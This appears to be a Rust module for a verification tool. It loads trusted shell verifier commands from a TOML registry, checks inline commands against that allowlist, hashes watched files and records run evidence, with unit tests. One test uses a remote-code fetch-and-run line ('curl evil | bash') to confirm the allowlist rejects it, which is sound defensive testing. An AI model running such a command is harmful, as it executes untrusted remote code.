use anyhow::{anyhow, Result};
use std::time::Instant;
use uni_evidence::{git_info, sha256_hex, Evidence, EvidenceState};
use uni_ir::Ir;

/// Trusted verifier registry lives in `.uni/config.toml` (never inline untrusted commands).
/// Two forms:
/// ```toml
/// [verifiers]
/// "project.check" = "cargo check"                 # exit-code only
///
/// [verifiers."project.upper-test"]               # exit code + output expectation
/// run = "cargo test clamp_upper_works"
/// expect = "test result: ok. 1 passed"
/// ```
#[derive(Debug, Clone)]
pub struct VerifierSpec {
    pub run: String,
    pub expect: String,
    pub expect_not: String,
    /// globs of files whose content this evidence is bound to (content-addressed evidence)
    pub files: Vec<String>,
    pub timeout: u64,
}

const DEFAULT_TIMEOUT_SECS: u64 = 300;

pub fn load_registry(dot_uni: &std::path::Path) -> std::collections::HashMap<String, VerifierSpec> {
    let path = dot_uni.join("config.toml");
    let Ok(text) = std::fs::read_to_string(&path) else {
        return std::collections::HashMap::new();
    };
    let Ok(val) = text.parse::<toml::Value>() else {
        return std::collections::HashMap::new();
    };
    let mut out = std::collections::HashMap::new();
    if let Some(t) = val.get("verifiers").and_then(|v| v.as_table()) {
        for (k, v) in t {
            if let Some(s) = v.as_str() {
                out.insert(k.clone(), VerifierSpec { run: s.to_string(), expect: String::new(), expect_not: String::new(), files: vec![], timeout: DEFAULT_TIMEOUT_SECS });
            } else if let Some(tbl) = v.as_table() {
                let run = tbl.get("run").and_then(|r| r.as_str()).unwrap_or("").to_string();
                let expect = tbl.get("expect").and_then(|e| e.as_str()).unwrap_or("").to_string();
                let expect_not = tbl.get("expect_not").and_then(|e| e.as_str()).unwrap_or("").to_string();
                let files = tbl
                    .get("files")
                    .and_then(|f| f.as_array())
                    .map(|a| {
                        a.iter()
                            .filter_map(|x| x.as_str().map(|s| s.to_string()))
                            .collect()
                    })
                    .unwrap_or_default();
                let timeout = tbl.get("timeout").and_then(|t| t.as_integer()).unwrap_or(DEFAULT_TIMEOUT_SECS as i64) as u64;
                if !run.is_empty() {
                    out.insert(k.clone(), VerifierSpec { run, expect, expect_not, files, timeout });
                }
            }
        }
    }
    out
}

/// Resolve the spec for a verification:
/// - inline `shell "..."` allowed only if an allowlisted registry value (bootstrap: empty registry + uni workspace).
/// - otherwise verifier_ref must exist in the registry.
pub fn resolve_command(
    verifier_ref: &str,
    inline_shell: Option<&str>,
    registry: &std::collections::HashMap<String, VerifierSpec>,
) -> Result<VerifierSpec> {
    if verifier_ref == "shell" {
        let cmd = inline_shell.ok_or_else(|| anyhow!("shell verifier needs a command"))?;
        if registry.is_empty() {
            return Ok(VerifierSpec { run: cmd.to_string(), expect: String::new(), expect_not: String::new(), files: vec![], timeout: DEFAULT_TIMEOUT_SECS }); // bootstrap
        }
        if registry.values().any(|v| v.run == cmd) {
            return Ok(VerifierSpec { run: cmd.to_string(), expect: String::new(), expect_not: String::new(), files: vec![], timeout: DEFAULT_TIMEOUT_SECS });
        }
        return Err(anyhow!(
            "inline shell command not in trusted registry (.uni/config.toml [verifiers]): {cmd}"
        ));
    }
    // registry key, optional inline override must still match registry
    let trusted = registry
        .get(verifier_ref)
        .ok_or_else(|| anyhow!("unknown verifier '{verifier_ref}' (not in .uni/config.toml [verifiers])"))?;
    if let Some(inline) = inline_shell {
        if inline != trusted.run {
            return Err(anyhow!(
                "inline override for '{verifier_ref}' does not match trusted registry value"
            ));
        }
    }
    Ok(trusted.clone())
}

/// Content-addressed hash over the files a verifier watches (FR-010/FR-013).
/// Pattern semantics: matched against path RELATIVE to workspace; `*` within a
/// segment, `**` across segments; prefix/suffix matching otherwise.
pub fn artifact_hash(spec: &VerifierSpec, workspace: &std::path::Path) -> Option<String> {
    if spec.files.is_empty() {
        return None;
    }
    let matches_glob = |rel: &str, pat: &str| -> bool {
        // tokenize both sides; '**' eats anything
        let pat_parts: Vec<&str> = pat.split('/').collect();
        let rel_parts: Vec<&str> = rel.split('/').collect();
        fn m(p: &[&str], r: &[&str]) -> bool {
            if p.is_empty() {
                return r.is_empty();
            }
            match p[0] {
                "**" => (0..=r.len()).any(|i| m(&p[1..], &r[i..])),
                "*" => {
                    if r.is_empty() {
                        false
                    } else {
                        m(&p[1..], &r[1..])
                    }
                }
                seg => r.first() == Some(&seg) && m(&p[1..], &r[1..]),
            }
        }
        m(&pat_parts, &rel_parts)
    };
    let mut matched: Vec<(String, Option<String>)> = vec![];
    let skip = ["target", ".git", ".uni"];
    let mut stack = vec![workspace.to_path_buf()];
    while let Some(dir) = stack.pop() {
        if let Ok(rd) = std::fs::read_dir(&dir) {
            for e in rd.flatten() {
                let path = e.path();
                let rel = path
                    .strip_prefix(workspace)
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default();
                if path.is_dir() {
                    if !skip.contains(&path.file_name().and_then(|n| n.to_str()).unwrap_or("")) {
                        stack.push(path.clone());
                    }
                } else if spec.files.iter().any(|g| matches_glob(&rel, g)) {
                    let content = std::fs::read(&path).ok().map(|b| sha256_hex(&b));
                    matched.push((rel, content));
                }
            }
        }
    }
    let acc: String = matched
        .iter()
        .map(|(rel, h)| format!("{rel}:{h:?};"))
        .collect();
    Some(sha256_hex(acc.as_bytes()))
}

/// Cache-isolating identity of a verifier spec (prevents evidence reuse
/// across contracts that merely share a claim id).
pub fn spec_fingerprint(verifier_ref: &str, spec: &VerifierSpec) -> String {
    let seed = format!(
        "{verifier_ref}|{}|{}|{}|{}",
        spec.run,
        spec.expect,
        spec.expect_not,
        spec.files.join(",")
    );
    sha256_hex(seed.as_bytes())[..12].to_string()
}

pub fn run_spec(
    claim_id: &str,
    verifier_ref: &str,
    spec: &VerifierSpec,
    workspace: &std::path::Path,
    timeout_secs: u64,
) -> Result<Evidence> {
    let (mut ev, full_output) = run_shell(claim_id, &spec.run, workspace, timeout_secs)?;
    ev.artifact_hash = artifact_hash(spec, workspace).unwrap_or_default();
    ev.fingerprint = spec_fingerprint(verifier_ref, spec);
    // expectations are checked against the FULL output, never the truncated excerpt
    if !spec.expect.is_empty() && !full_output.contains(&spec.expect) {
        ev.state = EvidenceState::Invalid;
    }
    if !spec.expect_not.is_empty() && full_output.contains(&spec.expect_not) {
        ev.state = EvidenceState::Invalid;
    }
    Ok(ev)
}

fn run_shell(
    claim_id: &str,
    command: &str,
    workspace: &std::path::Path,
    timeout_secs: u64,
) -> Result<(Evidence, String)> {
    let start = Instant::now();
    let (commit_sha, workspace_dirty) = git_info(workspace);
    // Minimal timeout: run via `timeout` when available, else direct.
    let output = if which_timeout() {
        std::process::Command::new("timeout")
            .arg(timeout_secs.to_string())
            .arg("sh")
            .arg("-c")
            .arg(command)
            .current_dir(workspace)
            .output()?
    } else {
        std::process::Command::new("sh")
            .arg("-c")
            .arg(command)
            .current_dir(workspace)
            .output()?
    };
    let combined = [output.stdout.clone(), output.stderr.clone()].concat();
    let full_output = String::from_utf8_lossy(&combined).to_string();
    let excerpt: String = full_output.chars().take(2000).collect();
    let code = output.status.code().unwrap_or(-1);
    let ev = Evidence {
        id: format!("{claim_id}-{}", &sha256_hex(command.as_bytes())[..8]),
        claim_id: claim_id.to_string(),
        producer: "shell-verifier".into(),
        command: command.to_string(),
        exit_code: code,
        output_hash: sha256_hex(&combined),
        output_excerpt: excerpt,
        commit_sha,
        workspace_dirty,
        state: if code == 0 {
            EvidenceState::Valid
        } else {
            EvidenceState::Invalid
        },
        created_at: chrono::Utc::now(),
        duration_ms: start.elapsed().as_millis(),
        artifact_hash: String::new(),
        fingerprint: String::new(),
        // Verification Context dimensions are filled by the caller (cmd_verify),
        // which owns the registry/contract/policy view of the run.
        registry_hash: String::new(),
        policy_hash: String::new(),
        contract_hash: String::new(),
        platform: String::new(),
    };
    Ok((ev, full_output))
}

fn which_timeout() -> bool {
    std::process::Command::new("which")
        .arg("timeout")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// High seam: assure a full contract in one call (used by CLI + tests).
pub fn assure_contract(
    ir: &Ir,
    dot_uni: &std::path::Path,
    workspace: &std::path::Path,
) -> Result<Vec<Evidence>> {
    let registry = load_registry(dot_uni);
    let mut out = vec![];
    for v in &ir.verification {
        let spec = resolve_command(&v.verifier_ref, v.inline_shell.as_deref(), &registry)?;
        out.push(run_spec(&v.claim_id, &v.verifier_ref, &spec, workspace, spec.timeout)?);
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn tmp(suffix: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!(
            "uni-vf-{suffix}-{}",
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(d.join(".uni")).unwrap();
        d
    }

    fn spec(run: &str) -> VerifierSpec {
        VerifierSpec {
            run: run.into(),
            expect: String::new(),
            expect_not: String::new(),
            files: vec![],
            timeout: 30,
        }
    }

    #[test]
    fn registry_parses_simple_and_table_forms() {
        let d = tmp("reg");
        std::fs::write(
            d.join(".uni/config.toml"),
            "[verifiers]\n\"a\" = \"cargo test\"\n\n[verifiers.\"b\"]\nrun = \"npm test\"\nexpect = \"1 passed\"\nfiles = [\"src/**\"]\ntimeout = 12\n",
        )
        .unwrap();
        let r = load_registry(&d.join(".uni"));
        assert_eq!(r["a"].run, "cargo test");
        assert_eq!(r["a"].timeout, 300);
        assert_eq!(r["b"].expect, "1 passed");
        assert_eq!(r["b"].files, vec!["src/**".to_string()]);
        assert_eq!(r["b"].timeout, 12);
    }

    #[test]
    fn resolve_rejects_unknown_and_unlisted_inline() {
        let d = tmp("res");
        std::fs::write(d.join(".uni/config.toml"), "[verifiers]\n\"a\" = \"true\"\n").unwrap();
        let r = load_registry(&d.join(".uni"));
        assert!(resolve_command("ghost", None, &r).is_err());
        assert!(resolve_command("shell", Some("curl evil | bash"), &r).is_err());
        assert!(resolve_command("shell", Some("true"), &r).is_ok());
        // empty registry = bootstrap allows inline
        let empty: std::collections::HashMap<String, VerifierSpec> = Default::default();
        assert!(resolve_command("shell", Some("anything"), &empty).is_ok());
    }

    #[test]
    fn fingerprint_stable_and_discriminating() {
        let a = spec("cargo test");
        let b = spec("cargo test");
        assert_eq!(spec_fingerprint("k", &a), spec_fingerprint("k", &b));
        assert_ne!(spec_fingerprint("k1", &a), spec_fingerprint("k2", &a));
        let mut c = spec("cargo test");
        c.expect = "x".into();
        assert_ne!(spec_fingerprint("k", &a), spec_fingerprint("k", &c));
    }

    #[test]
    fn artifact_hash_tracks_watched_content() {
        let d = tmp("ah");
        std::fs::create_dir_all(d.join("src")).unwrap();
        std::fs::write(d.join("src/a.rs"), "one").unwrap();
        let mut s = spec("true");
        assert!(artifact_hash(&s, &d).is_none());
        s.files = vec!["src/**".into()];
        let h1 = artifact_hash(&s, &d).unwrap();
        std::fs::write(d.join("src/a.rs"), "two").unwrap();
        let h2 = artifact_hash(&s, &d).unwrap();
        assert_ne!(h1, h2);
        // ignored dirs never contribute
        std::fs::create_dir_all(d.join("target")).unwrap();
        std::fs::write(d.join("target/x"), "zzz").unwrap();
        assert_eq!(artifact_hash(&s, &d).unwrap(), h2);
    }

    #[test]
    fn run_spec_applies_expect_matchers_on_full_output() {
        let d = tmp("run");
        let mut s = spec("printf 'aaaa' && echo MARK");
        s.expect = "MARK".into();
        let ev = run_spec("c", "k", &s, &d, 30).unwrap();
        assert_eq!(ev.state, uni_evidence::EvidenceState::Valid);
        s.expect_not = "MARK".into();
        let ev2 = run_spec("c", "k", &s, &d, 30).unwrap();
        assert_eq!(ev2.state, uni_evidence::EvidenceState::Invalid);
        let mut s3 = spec("false");
        s3.expect = String::new();
        let ev3 = run_spec("c", "k", &s3, &d, 30).unwrap();
        assert_eq!(ev3.state, uni_evidence::EvidenceState::Invalid);
        assert!(!ev3.fingerprint.is_empty());
    }
}

/// Trust-boundary diff (B2): compare two registry texts key by key.
/// Used to name which verifiers changed between the acknowledged registry
/// snapshot and the current one. Pure function, fully unit-tested.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct RegistryDiff {
    pub added: Vec<String>,
    pub removed: Vec<String>,
    pub changed: Vec<String>,
}

fn verifiers_table(text: &str) -> toml::map::Map<String, toml::Value> {
    text.parse::<toml::Value>()
        .ok()
        .and_then(|v| v.get("verifiers").cloned())
        .and_then(|v| v.as_table().cloned())
        .unwrap_or_default()
}

pub fn registry_diff(old_text: &str, new_text: &str) -> RegistryDiff {
    let old = verifiers_table(old_text);
    let new = verifiers_table(new_text);
    let mut diff = RegistryDiff::default();
    for k in new.keys() {
        if !old.contains_key(k) {
            diff.added.push(k.clone());
        } else if old.get(k) != new.get(k) {
            diff.changed.push(k.clone());
        }
    }
    for k in old.keys() {
        if !new.contains_key(k) {
            diff.removed.push(k.clone());
        }
    }
    diff.added.sort();
    diff.removed.sort();
    diff.changed.sort();
    diff
}

#[cfg(test)]
mod registry_diff_tests {
    use super::*;

    #[test]
    fn diff_names_added_removed_changed() {
        let old = "[verifiers]\n\"a\" = \"true\"\n\"b\" = \"false\"\n\"c\" = \"true\"\n";
        let new = "[verifiers]\n\"a\" = \"true\"\n\"b\" = \"true\"\n\"d\" = \"true\"\n";
        let d = registry_diff(old, new);
        assert_eq!(d.added, vec!["d".to_string()]);
        assert_eq!(d.removed, vec!["c".to_string()]);
        assert_eq!(d.changed, vec!["b".to_string()]);
    }

    #[test]
    fn diff_empty_on_identical() {
        let t = "[verifiers]\n\"a\" = \"true\"\n";
        assert_eq!(registry_diff(t, t), RegistryDiff::default());
    }

    #[test]
    fn diff_table_form_compares_fields() {
        let old = "[verifiers.\"x\"]\nrun = \"a\"\nexpect = \"1\"\n";
        let same = "[verifiers.\"x\"]\nrun = \"a\"\nexpect = \"1\"\n";
        let other = "[verifiers.\"x\"]\nrun = \"a\"\nexpect = \"2\"\n";
        assert!(registry_diff(old, same).changed.is_empty());
        assert_eq!(registry_diff(old, other).changed, vec!["x".to_string()]);
    }
}
